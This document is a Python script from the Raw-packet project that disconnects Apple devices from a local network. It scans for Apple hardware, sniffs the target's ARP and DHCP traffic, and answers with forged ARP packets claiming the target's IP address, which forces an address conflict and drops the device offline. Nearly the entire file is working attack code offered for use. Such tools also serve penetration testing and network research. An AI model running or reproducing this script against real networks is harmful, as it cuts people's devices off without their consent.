#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
apple_arp_dos.py: Disconnect Apple device in local network with ARP packets (apple_arp_dos)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Scanners.scanner import Scanner
from raw_packet.Scanners.arp_scanner import ArpScan
from raw_packet.Utils.network import RawARP, RawSniff, RawSend
from raw_packet.Utils.tm import ThreadManager
from argparse import ArgumentParser, RawTextHelpFormatter
from time import sleep
from typing import Union, List, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
__script_name__ = 'Disconnect Apple device in local network with ARP packets (apple_arp_dos)'
# endregion


# region class AppleArpDos
class AppleArpDos:

    # region Init Raw-packet classes
    base: Base = Base()
    sniff: RawSniff = RawSniff()
    arp: RawARP = RawARP()
    # endregion

    # region Init
    def __init__(self,
                 network_interface: str,
                 your_mac_address: str,
                 apple_device_mac_address: str,
                 apple_device_ip_address: str,
                 quit: bool = False):
        """
        Init
        :param network_interface: Network interface name
        :param your_mac_address: Your MAC address
        :param apple_device_mac_address: Target Apple device MAC address
        :param apple_device_ip_address: Target Apple device IPv4 address
        :param quit: Quit mode
        """

        # region Create raw socket
        self.network_interface = network_interface
        self.raw_send: RawSend = RawSend(network_interface=self.network_interface)
        # endregion

        # region Set variables
        self.your_mac_address = your_mac_address
        self.apple_device_mac_address = apple_device_mac_address
        self.apple_device_ip_address = apple_device_ip_address
        self.quit = quit
        # endregion

    # endregion

    # region Start ARP DOS
    def start(self):

        # region Start _sniffer
        tm = ThreadManager(2)
        tm.add_task(self._sniffer)
        # endregion

        # region Send first Multicast ARP request packets
        sleep(3)
        if not self.quit:
            self.base.print_warning('Send initial Multicast ARP requests')
        self._send_arp_requests(count_of_packets=5)
        # endregion

        # region Wait for completion
        tm.wait_for_completion()
        # endregion

    # endregion

    # region ARP request sender
    def _send_arp_requests(self, count_of_packets: int = 5) -> None:
        random_ip_address: str = self.base.get_random_ip_on_interface(self.network_interface)
        arp_init_request = self.arp.make_request(ethernet_src_mac=self.your_mac_address,
                                                 ethernet_dst_mac='33:33:00:00:00:01',
                                                 sender_mac=self.your_mac_address,
                                                 sender_ip=self.apple_device_ip_address,
                                                 target_mac='00:00:00:00:00:00',
                                                 target_ip=random_ip_address)
        self.raw_send.send(packet=arp_init_request, count=count_of_packets, delay=0.5)
    # endregion

    # region ARP reply sender
    def _send_arp_reply(self) -> None:
        arp_reply = self.arp.make_response(ethernet_src_mac=self.your_mac_address,
                                           ethernet_dst_mac=self.apple_device_mac_address,
                                           sender_mac=self.your_mac_address,
                                           sender_ip=self.apple_device_ip_address,
                                           target_mac=self.apple_device_mac_address,
                                           target_ip=self.apple_device_ip_address)
        self.raw_send.send(packet=arp_reply)
        self.base.print_info('ARP response to: ', self.apple_device_ip_address, ' "' + self.apple_device_ip_address +
                             ' is at ' + self.your_mac_address + '"')
    # endregion

    # region Analyze packet
    def _analyze(self, packet: Dict) -> None:

        # region ARP packet
        if 'ARP' in packet.keys():
            if packet['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                    packet['ARP']['target-mac'] == '00:00:00:00:00:00' and \
                    packet['ARP']['target-ip'] == self.apple_device_ip_address:
                self.base.print_info('ARP packet from: ', packet['Ethernet']['source'],
                                     ' "Who has ' + packet['ARP']['target-ip'] +
                                     '? Tell ' + packet['ARP']['sender-ip'] + '"')
                self._send_arp_reply()
        # endregion

        # region DHCPv4 packet
        else:
            if 'DHCPv4' in packet.keys():
                if packet['DHCPv4'][53] == 4:
                    self.base.print_success('DHCPv4 Decline from: ', packet['Ethernet']['source'],
                                            ' IPv4 address conflict detection!')
                if packet['DHCPv4'][53] == 3:
                    if 50 in packet['DHCPv4'].keys():
                        self.apple_device_ip_address = str(packet['DHCPv4'][50])
                        self.base.print_success('DHCPv4 Request from: ', self.apple_device_mac_address,
                                                ' requested ip: ', self.apple_device_ip_address)
        # endregion

    # endregion

    # region Sniff ARP and DHCP request from target
    def _sniffer(self) -> None:
        self.sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=self._analyze,
                         filters={'Ethernet': {'source': self.apple_device_mac_address},
                                  'ARP': {'opcode': 1},
                                  'IPv4': {'source-ip': '0.0.0.0', 'destination-ip': '255.255.255.255'},
                                  'UDP': {'source-port': 68, 'destination-port': 67}},
                         network_interface=self.network_interface,
                         scapy_filter='arp or (udp and (port 67 or 68))',
                         scapy_lfilter=lambda eth: eth.src == self.apple_device_mac_address)
    # endregion

# endregion


# region Main function
def main():

    # region Init Raw-packet classes
    base: Base = Base()
    # endregion

    # region Check user and platform
    base.check_user()
    base.check_platform(available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    try:
        # region Parse script arguments
        script_description: str = \
            base.get_banner() + '\n' + \
            ' ' * (int((55 - len(__script_name__)) / 2)) + \
            base.info_text(__script_name__) + '\n\n'
        parser = ArgumentParser(description=script_description, formatter_class=RawTextHelpFormatter)
        parser.add_argument('-i', '--interface', type=str, help='Set interface name for send ARP packets', default=None)
        parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
        parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
        parser.add_argument('-n', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection',
                            default=False)
        parser.add_argument('-q', '--quit', action='store_true', help='Minimal output',
                            default=False)
        args = parser.parse_args()
        # endregion

        # region Print banner
        if not args.quit:
            base.print_banner()
        # endregion

        # region Get listen network interface, your IP and MAC address, first and last IP in local network
        if args.interface is None:
            base.print_warning('Please set a network interface for sniffing ARP and DHCP requests ...')
        listen_network_interface: str = base.network_interface_selection(args.interface)
        your_mac_address: str = base.get_interface_mac_address(listen_network_interface)
        your_ip_address: str = base.get_interface_ip_address(listen_network_interface)
        first_ip_address: str = base.get_first_ip_on_interface(listen_network_interface)
        last_ip_address: str = base.get_last_ip_on_interface(listen_network_interface)
        arp_scan: ArpScan = ArpScan(network_interface=listen_network_interface)
        scanner: Scanner = Scanner(network_interface=listen_network_interface)
        # endregion

        # region General output
        if not args.quit:
            base.print_info('Listen network interface: ', listen_network_interface)
            base.print_info('Your IP address: ', your_ip_address)
            base.print_info('Your MAC address: ', your_mac_address)
            base.print_info('First ip address: ', first_ip_address)
            base.print_info('Last ip address: ', last_ip_address)
        # endregion

        # region Check target IP and new IP addresses
        if args.target_ip is not None:
            assert base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address), \
                'Bad value `-t, --target_ip`: ' + base.error_text(args.target_ip) + \
                '; Target IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
            if args.target_mac is None:
                base.print_info('Find MAC address of Apple device with IP address: ', args.target_ip, ' ...')
                target_mac = arp_scan.get_mac_address(target_ip_address=args.target_ip,
                                                      exit_on_failure=True,
                                                      show_scan_percentage=False)
            else:
                assert base.mac_address_validation(args.target_mac), \
                    'Bad MAC address `-m, --target_mac`: ' + base.error_text(args.target_mac) + \
                    '; example MAC address: ' + base.info_text('12:34:56:78:90:ab')
                target_mac = args.target_mac
            apple_device = [args.target_ip, target_mac, 'Apple, Inc.']
        # endregion

        # region Find Apple devices in local network with arp or nmap scan
        else:
            if not args.nmap_scan:
                base.print_info('Find Apple devices in local network with ARP scan ...')
                apple_devices: List[List[str]] = scanner.find_apple_devices_by_mac(listen_network_interface)
            else:
                base.print_info('Find Apple devices in local network with NMAP scan ...')
                apple_devices: List[List[str]] = scanner.find_apple_devices_with_nmap(listen_network_interface)
            apple_device = scanner.apple_device_selection(apple_devices=apple_devices, exit_on_failure=True)
        # endregion

        # region Print target IP and MAC address
        if not args.quit:
            base.print_info('Target: ', apple_device[0] + ' (' + apple_device[1] + ')')
        # endregion

        # region Start ARP DOS
        apple_arp_dos: AppleArpDos = AppleArpDos(network_interface=listen_network_interface,
                                                 your_mac_address=your_mac_address,
                                                 apple_device_mac_address=apple_device[1],
                                                 apple_device_ip_address=apple_device[0],
                                                 quit=args.quit)
        apple_arp_dos.start()
        # endregion

    except KeyboardInterrupt:
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)
# endregion


# region Call Main function
if __name__ == '__main__':
    main()
# endregion
